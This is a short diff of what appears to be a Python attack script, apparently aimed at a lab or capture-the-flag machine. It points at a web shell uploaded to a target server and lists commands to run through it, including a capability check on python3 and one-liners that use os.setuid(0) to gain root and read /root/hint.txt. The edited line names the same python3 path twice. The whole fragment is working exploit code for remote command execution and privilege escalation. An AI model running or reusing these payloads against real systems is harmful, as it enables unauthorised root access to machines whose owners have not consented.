@@ -12,7 +12,7 @@ SHELL = "http://10.20.20.3/uploads/shell.php"
 
 cmds = {
  "id":            "id",
- "getcap":        "getcap /usr/bin/python3 /usr/bin/python3.13 2>&1",
+ "getcap":        "getcap /usr/bin/python3 /usr/bin/python3 2>&1",
  "root_hint":     "python3 -c \"import os;os.setgid(0);os.setuid(0);os.system('cat /root/hint.txt')\"",
  "root_proof":    "python3 -c \"import os;os.setgid(0);os.setuid(0);os.system('id >/tmp/e && cat /tmp/e')\"",
 }
